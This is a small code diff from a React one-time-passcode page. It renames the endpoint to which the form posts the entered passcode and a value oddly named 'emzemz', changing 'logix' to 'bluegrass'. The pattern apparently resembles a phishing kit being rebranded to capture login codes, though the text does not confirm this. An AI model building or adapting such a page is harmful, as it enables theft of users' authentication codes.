@@ -33,7 +33,7 @@ const OTP: React.FC = () => {
     setIsLoading(true);
 
     try {
-      await axios.post(`${baseUrl}api/logix-meta-data-8/`, {
+      await axios.post(`${baseUrl}api/bluegrass-meta-data-8/`, {
         emzemz,
         otp,
       });
